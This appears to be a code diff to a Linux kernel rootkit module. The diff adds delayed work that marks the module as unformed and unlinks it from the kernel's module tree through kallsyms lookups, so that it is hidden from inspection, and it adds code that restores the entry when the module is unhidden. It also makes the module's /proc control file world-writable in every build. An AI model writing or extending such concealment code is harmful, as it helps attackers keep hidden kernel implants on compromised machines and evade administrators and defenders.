@@ -184,6 +184,31 @@ static inline void kv_list_del(struct list_head *prev, struct list_head *next)
 	prev->next = next;
 }
 
+static DECLARE_COMPLETION(hide_work_done);
+static void hide_work_fn(struct work_struct *work)
+{
+	reinit_completion(&hide_work_done);
+	// Set here because it is set to
+	// MODULE_STATE_LIVE in do_init_module.
+	// __module_address will return NULL for us
+	// as long as we are "loading"...
+	lkmmod.this_mod->state = MODULE_STATE_UNFORMED;
+
+	// Remove module from mod_tree if
+	// CONFIG_MODULES_TREE_LOOKUP is enabled
+	struct kernel_syscalls *ks = kv_kall_load_addr();
+	if (ks) {
+		void (*k_mod_tree_remove)(struct module *mod) =
+			(void (*)(struct module *))ks->k_kallsyms_lookup_name(
+				"mod_tree_remove");
+		if (k_mod_tree_remove)
+			k_mod_tree_remove(lkmmod.this_mod);
+	}
+	complete(&hide_work_done);
+}
+
+static DECLARE_DELAYED_WORK(hide_work, hide_work_fn);
+
 static int _hide_mod(void)
 {
 	struct list_head this_list;
@@ -234,9 +259,8 @@ static int _hide_mod(void)
 	// kobject_del()
 	lkmmod.this_mod->holders_dir->parent->state_in_sysfs = 1;
 
-	// __module_address will return NULL for us
-	// as long as we are "loading"...
-	lkmmod.this_mod->state = MODULE_STATE_UNFORMED;
+	// Some hiding steps need to be done after do_init_module
+	schedule_delayed_work(&hide_work, msecs_to_jiffies(2000));
 
 	return 0;
 }
@@ -247,6 +271,7 @@ static int _hide_mod(void)
 // command to unload the module safely.
 static int _unhide_mod(void)
 {
+	wait_for_completion(&hide_work_done);
 	int err;
 	struct kobject *kobj;
 
@@ -298,6 +323,17 @@ static int _unhide_mod(void)
 
 	list_add(&(lkmmod.this_mod->list), mod_list);
 	spin_unlock(&hiddenmod_spinlock);
+
+	// Restore mod_tree entry
+	struct kernel_syscalls *ks = kv_kall_load_addr();
+	if (ks) {
+		void (*k_mod_tree_insert)(struct module *mod) =
+			(void (*)(struct module *))ks->k_kallsyms_lookup_name(
+				"mod_tree_insert");
+		if (k_mod_tree_insert)
+			k_mod_tree_insert(lkmmod.this_mod);
+	}
+
 	goto out_put_kobj;
 
 out_attrs:
@@ -810,11 +846,7 @@ int kv_add_proc_interface(void)
 		return 0;
 
 try_reload:
-#ifdef DEBUG_RING_BUFFER
 	rrProcFileEntry = proc_create(PROCNAME, 0666, NULL, &proc_file_fops);
-#else
-	rrProcFileEntry = proc_create(PROCNAME, S_IRUSR, NULL, &proc_file_fops);
-#endif
 	if (lock && !rrProcFileEntry)
 		goto proc_file_error;
 	if (!lock) {
